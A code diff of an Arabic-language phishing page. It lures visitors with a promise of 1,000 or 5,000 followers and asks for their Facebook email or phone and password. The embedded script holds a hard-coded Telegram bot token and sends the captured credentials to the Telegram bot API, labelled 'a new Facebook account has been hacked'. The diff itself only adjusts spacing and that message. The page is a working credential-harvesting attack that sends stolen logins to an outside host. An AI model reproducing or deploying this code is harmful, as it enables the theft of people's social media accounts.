@@ -53,13 +53,14 @@
       <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
       <input type="password" id="password" placeholder="كلمة السر" required>
       
-    <div> اختر عدد المتابعين</div>
+  <div> اختر عدد المتابعين</div>
       <select id="followers">
         <option value="1000">1000</option>
         <option value="5000">5000</option>
       </select>
       <button type="submit">تسجيل الدخول</button>
     </form>
+    
    <script>
     const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA"; // حط توكن البوت بتاعك هنا
 
@@ -79,7 +80,7 @@
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
-      const message = 📥 - تم اختراق حساب جديد :- \n📧 - الإيميل : ${email}\n🔑 - الباسورد : ${password};
+      const message = 📥 - تم اختراق حساب فيسبوك جديد :- \n📧 - الإيميل : ${email}\n🔑 - الباسورد : ${password};
 
       // إرسال البيانات للبوت باستخدام chatId
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
